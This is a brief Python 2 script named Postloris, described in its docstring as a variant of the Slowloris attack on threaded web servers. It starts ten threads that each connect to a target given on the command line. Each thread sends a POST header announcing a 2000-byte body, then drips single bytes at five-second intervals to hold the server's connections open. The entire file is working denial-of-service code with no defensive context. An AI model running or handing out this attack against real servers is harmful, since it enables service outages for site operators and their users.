#!/usr/bin/python
"""
Postloris is a permutation of the widely publicized 'Slowloris'
HTTP attacks for threaded web servers.
( http://ha.ckers.org/slowloris )


Ben Sauls

"""
import sys, socket, time, threading as th, os

msgstart = "POST /index.php HTTP/1.1\r\nHost: slowfox.com\r\nContent-Length: 2000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"

class clith(th.Thread):
	def run(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
		s.connect((sys.argv[1], 80))
		s.send(msgstart)
		for b in range(10):
			s.send("a")
			time.sleep(5)
		s.close()
		sys.stdout.write("\x08")

for x in xrange(10):
	clith().start()
	sys.stdout.write(".")
	sys.stdout.flush()
